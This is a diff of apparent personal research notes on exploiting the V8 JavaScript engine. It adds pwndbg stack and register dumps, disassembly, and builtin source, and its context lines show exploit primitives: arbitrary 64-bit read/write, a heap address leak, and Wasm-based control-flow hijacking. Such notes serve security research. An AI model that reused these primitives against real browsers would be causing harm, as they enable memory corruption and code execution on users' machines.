@@ -325,7 +325,45 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555556a9c4e8 <Builtins_InterpreterEntryTrampoline+424>    push   rcx
    0x555556a9c4e9 <Builtins_InterpreterEntryTrampoline+425>    ret    
 ```
+Stack looks like:
+```go
+pwndbg> tele 0x7fffffffd598
+00:0000│ rsp 0x7fffffffd598 —▸ 0xf76001dcbed ◂— 0x2500000ef1001dcd
+01:0008│     0x7fffffffd5a0 —▸ 0xf7600199c25 ◂— 0x4100000002000008
+02:0010│     0x7fffffffd5a8 —▸ 0xf76001d7fb5 ◂— 0x2500000725001a89
+03:0018│     0x7fffffffd5b0 —▸ 0xf76001dc0ed ◂— 0x2500000725001ad8
+04:0020│     0x7fffffffd5b8 ◂— 0x20 /* ' ' */
+05:0028│     0x7fffffffd5c0 —▸ 0xf7600199b35 ◂— 0x7100000002000008
+06:0030│     0x7fffffffd5c8 —▸ 0xf76001840b9 ◂— 0x250000072500181f
+07:0038│     0x7fffffffd5d0 —▸ 0xf7600199c25 ◂— 0x4100000002000008
+pwndbg> 
+08:0040│  0x7fffffffd5d8 —▸ 0xf76001dcbed ◂— 0x2500000ef1001dcd
+09:0048│  0x7fffffffd5e0 —▸ 0xf76001dcda1 ◂— 0x2500000725001923
+0a:0050│  0x7fffffffd5e8 —▸ 0xf7600000069 ◂— 0x4
+0b:0058│  0x7fffffffd5f0 —▸ 0xf7600000069 ◂— 0x4
+0c:0060│  0x7fffffffd5f8 ◂— 0x78a
+0d:0068│  0x7fffffffd600 —▸ 0x215700000671 ◂— 0x4a00400200000009 /* '\t' */
+0e:0070│  0x7fffffffd608 ◂— 0x1
+0f:0078│  0x7fffffffd610 —▸ 0xf7600199ce1 ◂— 0x250000072500181e
+pwndbg> 
+10:0080│     0x7fffffffd618 —▸ 0xf7600199d31 ◂— 0x50000001c001902
+11:0088│ rbp 0x7fffffffd620 —▸ 0x7fffffffd648 —▸ 0x7fffffffd6c0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd890 ◂— ...
+12:0090│     0x7fffffffd628 —▸ 0x555556af071c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+13:0098│     0x7fffffffd630 —▸ 0xf76001816c9 ◂— 0x250005f2c4001971
+14:00a0│     0x7fffffffd638 —▸ 0xf7600199ce1 ◂— 0x250000072500181e
+15:00a8│     0x7fffffffd640 ◂— 0x2c /* ',' */
+16:00b0│     0x7fffffffd648 —▸ 0x7fffffffd6c0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd890 —▸ 0x7fffffffd990 ◂— ...
+17:00b8│     0x7fffffffd650 —▸ 0x555556af045f (Builtins_JSEntry+159) ◂— pop qword ptr [r13 + 0x118]
+pwndbg> 
+18:00c0│  0x7fffffffd658 ◂— 0x0
+19:00c8│  0x7fffffffd660 ◂— 0x0
+1a:00d0│  0x7fffffffd668 ◂— 0x2
+1b:00d8│  0x7fffffffd670 ◂— 0x0
+... ↓     2 skipped
+1e:00f0│  0x7fffffffd688 —▸ 0x555556fa6000 —▸ 0xf7600000000 ◂— 0x40940
+1f:00f8│  0x7fffffffd690 —▸ 0x555556af03c0 (Builtins_JSEntry) ◂— push rbp
 
+```
 
 
 
@@ -389,6 +427,12 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 *R14  0x555556fbcaf0 —▸ 0x2dc8002000dd ◂— 0x4100000002000008
  R15  0x555556ebc000 (v8::internal::v8_flags) ◂— 0x100000000000100
 
+// breakpoints
+pwndbg> bl
+Num     Type           Disp Enb Address            What
+2       breakpoint     keep y   0x0000555555d90901 <v8::internal::Histogram::AddSample(int)+1>
+	stop only if *(long *)($rsp+8)==0x555555a596e1
+	breakpoint already hit 2 times
 
 ```
 
@@ -421,6 +465,7 @@ let heap_addr = v8_read64(ofs1) - 0x40000n;
 let low_ofs_started_page = heap_addr & 0xffffffffn;
 let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
 console.log("heap_addr: 0x" + heap_addr.toString(16));
+
 // ================================================================
 
 const builder = new WasmModuleBuilder();
@@ -477,6 +522,131 @@ v8_write64(0x2000d5n, heap_addr + 0x200000n);
 // console.log("[*] After overwriting length");
 instance.exports.func1(0x4141n);
 
+/// =========================
+heap_addr: 0x7b500000000
+target_page: 0x5b48cf65000
+
+pwndbg> tele 0x7b5002001b9-0x60
+00:0000│  0x7b500200159 —▸ 0x5b48cf65000 ◂— 0x0
+01:0008│  0x7b500200161 —▸ 0x7b500200000 ◂— 0x20012
 
 ```
 
+**Should understand how the program calls AddSample function? and why it changes rbp?**
+
+```js
+// stack PopReturn oob 
+// ============= asm ===============
+   0x555556c60928 <Builtins_JSToWasmWrapper+3176>    lea    rsp, [rsp + rcx*8]
+ ► 0x555556c6092c <Builtins_JSToWasmWrapper+3180>    push   r10                           <Builtins_InterpreterEntryTrampoline+295>
+   0x555556c6092e <Builtins_JSToWasmWrapper+3182>    ret   
+
+// ===============================================
+// asm 
+.text:0000555556AF2C95 loc_555556AF2C95:                       ; CODE XREF: Builtins_InterpreterEntryTrampoline:loc_555556AF2D07↓j
+.text:0000555556AF2C95                                         ; Builtins_InterpreterEntryTrampoline+1D3↓j
+.text:0000555556AF2C95                 mov     r15, [r13+4C78h]
+.text:0000555556AF2C9C                 movzx   r10d, byte ptr [r12+r9]
+.text:0000555556AF2CA1                 mov     rcx, [r15+r10*8]
+.text:0000555556AF2CA5                 call    rcx             ; Builtins_JSToWasmWrapper
+
+/// =============================================
+Builtins_JSEntryTrampoline
+static void Generate_JSEntryTrampolineHelper(MacroAssembler* masm,
+                                             bool is_construct) {
+// ...
+    // Push the receiver.
+    __ Push(r9);
+
+    // Invoke the builtin code.
+    Builtin builtin = is_construct ? Builtin::kConstruct : Builtins::Call();
+    __ CallBuiltin(builtin);
+// ...
+                                             }
+// ============= asm ================
+.text:0000555556AF0717                 call    Builtins_Call_ReceiverIsAny
+.text:0000555556AF071C                 mov     rsp, rbp
+.text:0000555556AF071F                 pop     rbp
+.text:0000555556AF0720                 retn
+/// After that it returns to JSEntry function
+
+void Builtins::Generate_JSEntry(MacroAssembler* masm) {
+  Generate_JSEntryVariant(masm, StackFrame::ENTRY, Builtin::kJSEntryTrampoline);
+}
+// Called with the native C calling convention. The corresponding function
+// signature is either:
+//   using JSEntryFunction = GeneratedCode<Address(
+//       Address root_register_value, Address new_target, Address target,
+//       Address receiver, intptr_t argc, Address** argv)>;
+// or
+//   using JSEntryFunction = GeneratedCode<Address(
+//       Address root_register_value, MicrotaskQueue* microtask_queue)>;
+void Generate_JSEntryVariant(MacroAssembler* masm, StackFrame::Type type,
+                             Builtin entry_trampoline) {
+  Label invoke, handler_entry, exit;
+  Label not_outermost_js, not_outermost_js_2;
+// ...
+
+  // Invoke the function by calling through JS entry trampoline builtin and
+  // pop the faked function when we return.
+  __ CallBuiltin(entry_trampoline);
+
+  // Unlink this frame from the handler chain.
+  __ PopStackHandler();
+
+                             }
+// =============== asm =========================
+.text:0000555556AF045A                 call    Builtins_JSEntryTrampoline
+.text:0000555556AF045F                 pop     qword ptr [r13+118h]
+.text:0000555556AF0466                 add     rsp, 8
+```
+Stacktrace:
+
+```js
+Builtins_JSToWasmWrapper
+// ...
+
+Builtins_Call_ReceiverIsAny
+Builtins_JSEntryTrampoline
+```
+
+How wasm decode function from number inside sandbox:
+![alt text](image-3.png)
+
+```js
+
+Python>(0x209601 >> 9) << 4
+0x104b0
+// ===============================================
+pwndbg> 
+0x0000555556ae74d3 in Builtins_CallFunction_ReceiverIsAny ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
+ RAX  0x1
+ RBX  0x0
+*RCX  0x104b0
+ RDX  0x58800000069 ◂— 0x4
+ RDI  0x588001a72c5 ◂— 0x250000072500181e
+ RSI  0x588001a7825 ◂— 0x95000004ca001902
+ R8   0x1
+ R9   0x588001816c9 ◂— 0x250000e6a4001971
+ R10  0x7fff98000000 ◂— 0x0
+ R11  0x7ffff7e18be0 (main_arena+96) —▸ 0x555557034760 ◂— 0x0
+ R12  0x588001a72c5 ◂— 0x250000072500181e
+ R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+ R14  0x58800000000 ◂— 0x40940
+ R15  0x555556af03c0 (Builtins_JSEntry) ◂— push rbp
+ RBP  0x7fffffffce18 —▸ 0x7fffffffce90 —▸ 0x7fffffffcff0 —▸ 0x7fffffffd060 —▸ 0x7fffffffd160 ◂— ...
+ RSP  0x7fffffffcdf8 —▸ 0x555556af071c (Builtins_JSEntryTrampoline+92) ◂— mov rsp, rbp
+*RIP  0x555556ae74d3 (Builtins_CallFunction_ReceiverIsAny+275) ◂— mov rcx, qword ptr [r10 + rcx]
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
+   0x555556ae7455 <Builtins_CallFunction_ReceiverIsAny+149>    jle    Builtins_CallFunction_ReceiverIsAny+259                <Builtins_CallFunction_ReceiverIsAny+259>
+    ↓
+   0x555556ae74c3 <Builtins_CallFunction_ReceiverIsAny+259>    mov    r10, qword ptr [r13 + 0x2510]
+   0x555556ae74ca <Builtins_CallFunction_ReceiverIsAny+266>    mov    ecx, dword ptr [rdi + 0xb]
+   0x555556ae74cd <Builtins_CallFunction_ReceiverIsAny+269>    shr    ecx, 9
+   0x555556ae74d0 <Builtins_CallFunction_ReceiverIsAny+272>    shl    ecx, 4
+ ► 0x555556ae74d3 <Builtins_CallFunction_ReceiverIsAny+275>    mov    rcx, qword ptr [r10 + rcx]
+   0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    rcx
+
+```
